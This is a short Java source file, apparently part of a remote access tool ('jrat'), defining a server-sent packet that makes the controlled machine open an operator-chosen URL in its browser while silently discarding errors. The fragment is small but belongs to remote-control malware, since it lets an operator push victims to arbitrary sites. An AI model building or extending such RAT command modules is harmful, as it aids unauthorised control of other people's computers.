package net.jrat.core.packet.server;

import java.awt.Desktop;
import java.net.URL;

import net.jrat.core.packet.IPacket;

public class S4PacketOpenWebsite implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String url;
	
	@Override
	public void execute(Object object) throws Exception
	{
		try
		{
			final URL url = new URL(this.url);
			Desktop.getDesktop().browse(url.toURI());
		}
		catch (Exception e) {}
	}
}